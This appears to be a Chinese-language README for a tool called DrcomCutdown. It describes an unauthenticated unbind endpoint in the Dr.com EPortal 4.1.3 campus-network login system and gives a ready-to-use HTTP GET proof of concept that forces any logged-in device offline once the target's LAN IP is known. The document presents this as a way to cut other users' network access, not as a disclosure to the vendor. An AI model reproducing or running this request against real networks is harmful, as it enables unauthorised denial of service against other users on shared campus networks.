# DrcomCutdown
Dr.com Eportal校园网认证系统任意踹人下线（断网）漏洞 附脚本

😎测试版本:
  **Guangzhou Hotspot Software Technology Co., Ltd. © 2020   EPortal4.1.3**

🥳效果:
  用此脚本可以将校园网内任意已登陆设备强制踹下线，实现断网效果（前提是得知道目标内网ip地址）

# 原理 -Principle
由于未对unbind路由做验证，导致任意知道受害者内网ip地址的人员，在使用一个简易将ip地址转换为int整型数字的算法后(已附脚本，算法在脚本里面)，可以实现无授权解绑目标mac地址，实现断网效果。

***POC:***
```
GET /eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ipToParseIntValue}&lang=en HTTP/1.1
Host: xx.xx.xx.xx:xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
```
